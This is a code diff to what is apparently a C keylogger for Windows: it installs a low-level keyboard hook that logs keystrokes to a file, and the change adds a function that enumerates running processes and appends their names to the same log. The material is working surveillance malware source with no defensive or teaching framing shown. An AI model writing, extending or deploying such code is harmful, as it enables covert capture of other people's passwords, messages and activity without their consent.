@@ -2,7 +2,8 @@
 #include <windows.h>
 #include <winuser.h>
 #include <stdlib.h>
-
+#include <tlhelp32.h>
+#include <tchar.h>
 LRESULT CALLBACK KeyboardProc(int input, WPARAM wParam, LPARAM lParam){
 	//open file
 	FILE *file;
@@ -43,11 +44,41 @@ LRESULT CALLBACK KeyboardProc(int input, WPARAM wParam, LPARAM lParam){
 	return 0;
 }
 
+BOOL GetProcess(){
+	HANDLE SnapShot;
+	PROCESSENTRY32 processentry;
+	FILE *file;
+	file = fopen("Log.txt","a");
+	SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if(SnapShot == INVALID_HANDLE_VALUE){
+		fprintf(file,"Error, unable to get System Snapshot");
+		fclose(file);
+		return( FALSE );
+	}
+	processentry.dwSize = sizeof( PROCESSENTRY32 );
+	if( !Process32First( SnapShot, &processentry ) )
+  	{
+     fprintf(file,"Error, unable to get information about system process");
+     CloseHandle(SnapShot );
+     fclose(file);
+     return( FALSE );
+  	}
+  	fprintf(file,"Running Programs ===========================");
+  	while(Process32Next(SnapShot,&processentry)){
+  		fprintf(file,("\n%s"), processentry.szExeFile );
+	  }
+	fprintf(file,"\n============================================\n");
+	CloseHandle(SnapShot);
+	fclose(file);
+	return(TRUE);
+}
+
 int main(){
 	//Set up windows message hook.
 	MSG msg;
 	HHOOK Hook;
 	Hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
+	GetProcess();
 	//loop 
 	 while (GetMessage(&msg, NULL, 0, 0) > 0) {
         TranslateMessage(&msg);
